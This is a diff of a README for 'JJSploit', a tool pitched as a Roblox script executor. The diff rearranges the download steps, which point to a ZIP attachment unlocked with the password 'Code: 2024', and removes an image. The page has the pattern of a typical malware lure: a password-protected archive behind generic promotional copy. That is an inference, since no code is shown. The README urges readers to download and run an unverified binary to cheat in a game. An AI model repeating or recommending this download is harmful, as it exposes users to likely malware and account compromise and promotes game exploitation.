@@ -3,8 +3,8 @@
 
 ## Installation
 To install JJSploit, follow these simple steps:
-1. Download the JJSploit package from here 
-    [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blueviolet)](https://github.com/user-attachments/files/17127912/JJSploit_64x.zip) Code: 2024
+1. Download the JJSploit package from here Code: 2024
+    [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blueviolet)](https://github.com/user-attachments/files/17127912/JJSploit_64x.zip)
 
 2. Extract the downloaded ZIP file to your desired location on your system.
 
@@ -15,9 +15,6 @@ To install JJSploit, follow these simple steps:
 - [Usage](#usage)
 - [Contributing](#contributing)
 - [License](#license)
-
-![maxresdefault (1)](https://github.com/user-attachments/assets/a73a790b-664a-479e-b56c-e52ce636d634)
-
 
 ## Introduction
 Welcome to JJSploit, the latest innovation in Roblox Executors, crafted specifically for enhanced performance and functionality. Within this repository, you’ll find all the essential resources and detailed documentation needed to get started with JJSploit. Whether you're a developer, an avid gamer, or someone passionate about Roblox modifications, JJSploit serves as a powerful tool to elevate and refine your Roblox experience.
